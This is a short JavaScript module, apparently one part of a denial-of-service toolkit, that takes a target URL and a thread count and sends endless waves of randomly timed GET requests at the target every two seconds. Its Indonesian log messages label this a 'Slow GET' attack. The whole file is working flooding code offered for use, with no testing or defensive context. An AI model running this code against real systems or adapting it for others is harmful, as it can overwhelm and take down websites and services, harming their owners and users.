const axios = require('axios');
const chalk = require('chalk');

module.exports = function(target, threads) {
  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      setTimeout(() => {
        axios.get(target)
          .then(() => console.log(chalk.yellow(`[✓] Slow GET sukses`)))
          .catch(() => console.log(chalk.red(`[x] Slow gagal`)));
      }, Math.random() * 3000);
    }
  }, 2000);
};